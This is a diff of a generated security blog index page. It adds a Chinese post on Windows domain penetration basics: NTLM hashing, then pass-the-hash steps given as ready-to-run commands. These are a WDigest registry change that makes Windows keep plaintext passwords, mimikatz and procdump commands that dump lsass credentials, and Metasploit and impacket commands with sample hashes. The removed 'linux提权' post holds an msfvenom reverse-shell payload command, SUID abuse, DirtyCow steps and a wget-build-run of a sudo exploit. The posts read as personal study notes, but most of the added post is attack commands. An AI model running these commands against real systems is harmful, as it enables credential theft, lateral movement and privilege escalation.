@@ -64,6 +64,81 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-域渗透基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2021-08-31T11:25:35.000Z" itemprop="datePublished">2021-08-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">域渗透基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>域渗透基础</p>
+<h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><p> NTLM协议的认证过程分为三步： </p>
+<p>1、协商：主要用于确认双方协议版本(NTLM v1/NTLM V2)</p>
+<p> 2、质询：就是挑战（Challenge）/响应（Response）认证机制起作用的范</p>
+<p> 3、验证：验证主要是在质询完成后，验证结果，是认证的最后</p>
+<p>SSO: 单点登入</p>
+<p>SAM数据库: windows本地认证登入, 存储本地账户信息</p>
+<p>NTDS数据库: windows域中登入, 存储域账户信息</p>
+<h5 id="NTLM生成过程"><a href="#NTLM生成过程" class="headerlink" title="NTLM生成过程"></a>NTLM生成过程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTLM HASH产生：</span><br><span class="line">假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</span><br><span class="line">admin(密码) </span><br><span class="line">-&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line">-&gt; Unicode（Unicode编码） &#x3D; 610064006d0069006e00</span><br><span class="line">-&gt; MD4(MD4算法加密) &#x3D; 209c6174da490caeb422f3fa5a7ae634(NTLM Hash)</span><br></pre></td></tr></table></figure>
+
+<h4 id="ntlml-hash密码格式"><a href="#ntlml-hash密码格式" class="headerlink" title="ntlml hash密码格式:"></a>ntlml hash密码格式:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</span><br><span class="line">§ 用户名称为：Administrator</span><br><span class="line">§ SID为：500</span><br><span class="line">§ LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE</span><br><span class="line">§ NTLM-HASH值为：683020925C5D8569C23AA724774CE6CC</span><br><span class="line">LM Hash是 AAD3B435B51404EEAAD3B435B51404EE 这表示空密码或者是未使用LMHASH</span><br></pre></td></tr></table></figure>
+
+<h2 id="PASS-THE-HASH"><a href="#PASS-THE-HASH" class="headerlink" title="PASS THE HASH"></a>PASS THE HASH</h2><p>目的: 扩大战果, 打个比方 ==&gt; <code>比如说, 目标的域环境中有大量的域内主机, 渗透拿到其中一个目标的NTLM HASH, 用这个NTLM HASH登入其他主机, 登入成功则拿下另一台主机</code></p>
+<p>关于pth的补丁编号: kb2871997</p>
+<p>lsass.exe: 存放账户的NTLM HASH, 账户的明文信息, windows 10 或者 windows server&gt;=  2012, 有做策略无法直接拿到明文账户密码</p>
+<p>解决方法: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v </span><br><span class="line">UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f &#x2F;&#x2F;开启明文密码抓取</span><br><span class="line"></span><br><span class="line">强制锁屏: &#x2F;&#x2F;让用户重新登入, 才可以抓取明文密码</span><br><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>看帮助信息: <code>::</code></p>
+<p>对当前的操作提权: <code>privilege::debug</code></p>
+<p>生成日志文件: <code>log</code>(记录所有信息)</p>
+<p>列出用户LM&amp;NTLM: <code>sekurlsa::msv</code></p>
+<p>列出用户的明文密码: <code>sekurlsa::wdigest</code></p>
+<p>列出kerberos凭据信息: <code>sekurlsa::kerberos</code></p>
+<p>列出所有的凭据信息: <code>sekurlsa::logonpasswords</code></p>
+<h5 id="mimikatz-procdump抓取密码"><a href="#mimikatz-procdump抓取密码" class="headerlink" title="mimikatz+procdump抓取密码"></a>mimikatz+procdump抓取密码</h5><p><code>procdump -accepteula -ma lsass.exe lsass</code></p>
+<p><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot;</code> exit       ==&gt; 加exit执行完后可以主动退出</p>
+<h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><p>如果拿到域账户面密码, 可以登入到任意一台主机, 如果拿到了域控的账户密码,  直接登入远程主机的话可以拿到管理员权限</p>
+<p>mimikatz的方式: sekurlsa::pth /user:Administrator /ntlm:xxxx /domain:域名</p>
+<p>访问: dir \\ip\c$</p>
+<p>msf的方式: </p>
+<p>exploit/windows/smb/psexec</p>
+<p>&gt; set RHOSTS 192.168.1.139</p>
+<p>&gt; set SMBPASS LM_HASH:NTLM_HASH</p>
+<p>&gt; set domain 域名</p>
+<p>&gt; set SMBUSER Administrator</p>
+<p>imapcket工具包:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py -hashes</span><br><span class="line">9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">psexec.py  -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">dcomexec.py  -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="cku7nx95x000sfsvj6pwx54b7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-端口转发和代理" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" class="article-date">
@@ -139,7 +214,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="cku2l99zu000vzgvj0q3rcyxo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="cku7nx96c000yfsvjf5y14hym" class="article-share-link">Share</a>
       
       
     </footer>
@@ -194,7 +269,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="cku2l99z2000azgvj2g9oauu8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="cku7nx958000afsvj8oi7f13s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -258,7 +333,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="cku2l99z7000czgvjh51ehr7d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="cku7nx95d000cfsvjhj4sg7rq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -328,7 +403,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="cku2l99z6000bzgvjc6h5habh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="cku7nx95a000bfsvj0sgi3ygl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -385,7 +460,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="cku2l99zq000pzgvj2lde04ie" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="cku7nx95w000rfsvjdzql9uzo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -451,7 +526,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="cku2l99zp000ozgvjb0bgelya" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="cku7nx95u000ofsvj71699h3h" class="article-share-link">Share</a>
       
       
     </footer>
@@ -533,7 +608,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="cku2l99zp000nzgvj3r7fgswx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="cku7nx95u000pfsvj0mq85oj5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -607,7 +682,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cku2l99z10009zgvjgufld2rw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cku7nx9560009fsvjd6v0c8d3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -678,75 +753,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="cku2l99z8000dzgvj15y74kae" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-linux提权" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/" class="article-date">
-  <time datetime="2021-08-01T07:25:43.000Z" itemprop="datePublished">2021-08-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/linux%E6%8F%90%E6%9D%83/">linux提权</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>metasplitable2:msfadmin/msfadmin</p>
-<p>searchsploit: 查找漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux木马生成:</span><br><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.135 lport&#x3D;4444 -f elf -o shell.elf</span><br></pre></td></tr></table></figure>
-
-<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>suid:默认会以特权用户的权限去执行</p>
-<p>s:特权用户</p>
-<p>加入有suid文件可以进入交互模式,那么就可以用提权或者做后门.</p>
-<p>less | more | tail</p>
-<p>apt | apt-get….</p>
-<p>提权步骤:</p>
-<p>find / -perm -u=s -type f 2&gt;/dev/null –&gt; 查找具有suid权限的文件</p>
-<p>以find命令为例:</p>
-<p>find /etc/passwd -exec /bin/bash -p ;  –&gt; 利用文件进入root权限的bash</p>
-<figure class="highlight plain"><figcaption><span>https://gtfobins.github.io/</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-<p>文件权限:<br>-:代表文件<br>l:代表链接(软链接–&gt;快捷方式;硬链接–&gt;复制了一份源文件)<br>d:代表目录<br>r 4:可读(read)<br>w 2:可写(write)<br>x 1:可执行(execution)</p>
-<p>d rwx r-x r-x<br>d:目录<br>rwx:当前用户的权限<br>r-x:当前用户组的权限<br>r-x:其他用户组的权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 内核提权漏洞</span><br><span class="line"></span><br><span class="line">脏牛漏洞:</span><br><span class="line"></span><br><span class="line">exp: https:&#x2F;&#x2F;github.com&#x2F;FireFart&#x2F;dirtycow&#x2F;blob&#x2F;master&#x2F;dirty.c</span><br><span class="line"></span><br><span class="line">1.上传脏牛到靶机</span><br><span class="line"></span><br><span class="line">2.对脏牛漏洞进行编译:</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">3.使用漏洞</span><br><span class="line"></span><br><span class="line">chmod u+x dirty</span><br><span class="line"></span><br><span class="line">.&#x2F;dirty 123123 &lt;-- 自定义的密码, 默认用户是firefart</span><br><span class="line"></span><br><span class="line">4.换源&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">#### 利用sudo提权</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>漏洞探测:<br>    用户可以使用非root的账户登录系统，运行“ sudoedit -s / ”命令，<br>    若返回如图以“ sudoedit：”开头的错误，则当前系统可能存在安全风险。<br>    不受影响的系统将显示以“ usage：”开头的错误响应。</p>
-<p>影响范围:<br>Sudo 1.8.2 - 1.8.31p2<br>Sudo 1.9.0 - 1.9.5p1</p>
-<p>poc地址: <a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a></p>
-<p>利用:<br>wget <a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a><br>tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz<br>cd CVE-2021-3156<br>chmod u+x *<br>make<br>./sudo-hax-me-a-sandwich 0</p>
-<pre><code>
-linux漏洞库: 
-
-https://github.com/qazbnm456/awesome-cve-poc
-
-https://github.com/SecWiki/linux-kernel-exploits
-
-
-
-shellcode: 机器码(二进制,十六进制)
-</code></pre>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="cku2l99zj000gzgvjehp3c6se" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="cku7nx95h000efsvjf6yd7tiv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -779,7 +786,7 @@ shellcode: 机器码(二进制,十六进制)
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
     </div>
   </div>
 
@@ -790,6 +797,10 @@ shellcode: 机器码(二进制,十六进制)
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">高低权限注入和敏感文件读写</a>
+          </li>
         
           <li>
             <a href="/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">sql注入请求方法</a>
@@ -805,10 +816,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/">加密编码算法和CDN绕过</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">Web网站框架安全</a>
           </li>
         
       </ul>
